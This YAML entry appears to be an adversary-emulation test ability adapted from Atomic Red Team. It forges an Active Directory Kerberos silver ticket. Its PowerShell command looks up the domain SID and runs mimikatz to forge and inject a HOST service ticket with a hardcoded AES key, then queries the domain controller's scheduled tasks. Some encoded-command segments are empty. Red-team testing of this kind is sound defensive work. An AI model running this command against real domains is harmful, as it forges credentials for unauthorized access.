- requirements: []
  name: Soumaia ART Tests - Crafting Active Directory silver tickets with mimikatz
  description: 'Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.

    The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.'
  tactic: credential-access
  technique_id: T1558.002
  technique_name: 'Steal or Forge Kerberos Tickets: Silver Ticket'
  executors:
  - cleanup: []
    timeout: 60
    platform: windows
    name: psh
    payloads: []
    parsers: []
    command: powershell -NoProfile -EncodedCommand ; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand  }; Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore; $domain_sid = "S-1-5-21-DEFAULT"; If ($domain_sid -Match "DEFAULT") { $domain = gwmi Win32_ComputerSystem | Select -Expand Domain; $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value; $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')) }; ">%TEMP%\silver.txt 2>&1 (`n  echo Purge existing tickets and create silver ticket:`n  klist purge`n  & $env:TEMP\ART-ExternalPayloads\mimikatz\x64\mimikatz.exe `"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\=%.%userdnsdomain% /ptt`" `"exit`"`n`n  echo.`n  echo executing:schtasks /query /S %logonserver:\\=%.%userdnsdomain%`n  schtasks /query /S %logonserver:\\=%.%userdnsdomain%`n  `n  echo.`n  echo Tickets after requesting schtasks:`n  klist`n`n  echo.`n  echo End of Silver Ticket attack`n)" -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat; echo "foo" | runas /netonly /user:fake "$env:TEMP\silver.bat" | Out-Null; do { Start-Sleep 1; Get-Content -Path "$env:TEMP\silver.txt" -Wait | ForEach-Object { if ($_ -match 'End of Silver Ticket attack') { break } } } while ($false); Get-Content $env:TEMP\silver.txt; Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore
  id: d6eca5ca-bef2-5e04-8ee3-c03e7f16b69d
